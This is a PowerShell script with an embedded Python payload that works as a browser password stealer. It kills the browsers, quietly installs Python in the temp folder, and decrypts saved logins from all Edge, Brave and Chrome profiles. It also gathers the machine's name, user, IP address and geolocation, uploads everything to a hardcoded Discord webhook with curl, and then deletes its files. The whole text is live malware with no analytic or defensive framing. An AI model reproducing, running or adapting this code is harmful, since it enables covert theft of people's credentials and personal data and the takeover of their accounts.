$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

# Kill browsers TRÈS agressivement
Get-Process -Name msedge,brave,chrome,firefox -EA 0 | Stop-Process -Force -EA 0
Start-Sleep -Seconds 3

try{
# Vérifier si Python est déjà installé
$pyPath="$env:TEMP\py"
$needInstall=$false

if(!(Test-Path "$pyPath\python.exe")){
 $needInstall=$true
}else{
 cd $pyPath
 $testLibs=.\python.exe -c "import Crypto,win32crypt,requests;print('OK')" 2>$null
 if($testLibs -ne "OK"){$needInstall=$true}
}

if($needInstall){
 Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
 Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
 (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
 Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
 cd $pyPath
 .\python.exe gp.py --no-warn-script-location 2>$null
 .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
 Remove-Item "$env:TEMP\py.zip" -Force -EA 0
}

cd $pyPath

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,glob
from Crypto.Cipher import AES

try:
 import requests
 ip=requests.get("https://api.ipify.org",timeout=3).text
 geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
 location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
 isp=geo.get('isp','N/A')
except:
 ip="N/A"
 location="N/A"
 isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def d(db,st,n):
 try:
  if not os.path.exists(db) or not os.path.exists(st):
   return []
  
  with open(st,'r',encoding='utf-8') as f:
   local_state=json.load(f)
  
  encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
  encrypted_key=encrypted_key[5:]
  k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
  
  temp_db=f"t_{n}_{os.getpid()}.db"
  max_retries=5
  
  for attempt in range(max_retries):
   try:
    if os.path.exists(temp_db):
     os.remove(temp_db)
    shutil.copy2(db,temp_db)
    break
   except:
    if attempt < max_retries-1:
     time.sleep(0.5)
    else:
     return []
  
  r=[]
  try:
   c=sqlite3.connect(temp_db,timeout=10)
   cursor=c.cursor()
   cursor.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''")
   
   for row in cursor.fetchall():
    try:
     url=row[0]
     user=row[1]
     enc_pwd=row[2]
     
     if enc_pwd and len(enc_pwd)>15:
      nonce=enc_pwd[3:15]
      ciphertext=enc_pwd[15:-16]
      tag=enc_pwd[-16:]
      
      cipher=AES.new(k,AES.MODE_GCM,nonce=nonce)
      pwd=cipher.decrypt_and_verify(ciphertext,tag).decode('utf-8','ignore')
      
      r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
    except:
     pass
   
   c.close()
  except:
   pass
  finally:
   try:
    if os.path.exists(temp_db):
     os.remove(temp_db)
   except:
    pass
  
  return r
  
 except:
  return []

def find_browser_profiles(browser_paths,browser_name):
 """Cherche tous les profils dans tous les chemins possibles"""
 results=[]
 
 for base_path in browser_paths:
  if not os.path.exists(base_path):
   continue
  
  # Vérifier Local State
  local_state=os.path.join(base_path,"Local State")
  if not os.path.exists(local_state):
   continue
  
  # Profil Default
  default_login=os.path.join(base_path,"Default","Login Data")
  if os.path.exists(default_login):
   pwd_list=d(default_login,local_state,f"{browser_name}-Default")
   results.extend(pwd_list)
  
  # Tous les autres profils (Profile 1, Profile 2, ...)
  for profile_dir in glob.glob(os.path.join(base_path,"Profile*")):
   profile_name=os.path.basename(profile_dir)
   profile_login=os.path.join(profile_dir,"Login Data")
   if os.path.exists(profile_login):
    pwd_list=d(profile_login,local_state,f"{browser_name}-{profile_name}")
    results.extend(pwd_list)
  
  # Profils "Person X" (certaines installations)
  for profile_dir in glob.glob(os.path.join(base_path,"Person*")):
   profile_name=os.path.basename(profile_dir)
   profile_login=os.path.join(profile_dir,"Login Data")
   if os.path.exists(profile_login):
    pwd_list=d(profile_login,local_state,f"{browser_name}-{profile_name}")
    results.extend(pwd_list)
 
 return results

# Chemins possibles pour chaque navigateur
edge_paths=[
 os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
 os.path.expandvars(r"%APPDATA%\Microsoft\Edge\User Data"),
 r"C:\Program Files\Microsoft\Edge\User Data",
 r"C:\Program Files (x86)\Microsoft\Edge\User Data"
]

brave_paths=[
 os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
 os.path.expandvars(r"%APPDATA%\BraveSoftware\Brave-Browser\User Data"),
 r"C:\Program Files\BraveSoftware\Brave-Browser\User Data",
 r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\User Data",
 # Brave Nightly/Beta
 os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser-Nightly\User Data"),
 os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser-Beta\User Data")
]

chrome_paths=[
 os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
 os.path.expandvars(r"%APPDATA%\Google\Chrome\User Data"),
 r"C:\Program Files\Google\Chrome\User Data",
 r"C:\Program Files (x86)\Google\Chrome\User Data"
]

# Collecter TOUS les résultats
res=[]
browsers=[]

# EDGE
edge_res=find_browser_profiles(edge_paths,"EDGE")
if edge_res:
 res.extend(edge_res)
 browsers.append(f"Edge: {len(edge_res)} passwords")

# BRAVE
brave_res=find_browser_profiles(brave_paths,"BRAVE")
if brave_res:
 res.extend(brave_res)
 browsers.append(f"Brave: {len(brave_res)} passwords")

# CHROME
chrome_res=find_browser_profiles(chrome_paths,"CHROME")
if chrome_res:
 res.extend(chrome_res)
 browsers.append(f"Chrome: {len(chrome_res)} passwords")

# DEBUG: Lister les chemins trouvés
debug_info=[]
debug_info.append("\nDEBUG - Browser paths found:")
for path in edge_paths:
 if os.path.exists(path):
  debug_info.append(f"✓ {path}")
for path in brave_paths:
 if os.path.exists(path):
  debug_info.append(f"✓ {path}")
for path in chrome_paths:
 if os.path.exists(path):
  debug_info.append(f"✓ {path}")

browser_info="\n".join(browsers) if browsers else "No browsers found"

info=f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {socket.gethostname()}
Language: {language}
Public IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}

BROWSERS DETECTED:
{browser_info}

TOTAL PASSWORDS: {len(res)}
{'='*60}
{''.join(debug_info)}
{'='*60}

"""

with open("p.txt","w",encoding="utf-8") as f:
 f.write(info)
 if res:
  f.write("\n".join(res))
 else:
  f.write("No passwords found.\n")

print("OK")
'@|Out-File "e.py" -Encoding UTF8

$r=.\python.exe e.py 2>$null

if($r -eq "OK"){
 curl.exe -F "file=@p.txt" $wh 2>$null
 Remove-Item p.txt,e.py -Force -EA 0
}

cd $env:TEMP

}catch{
 curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME - Error: $($_.Exception.Message)`"}" $wh
}
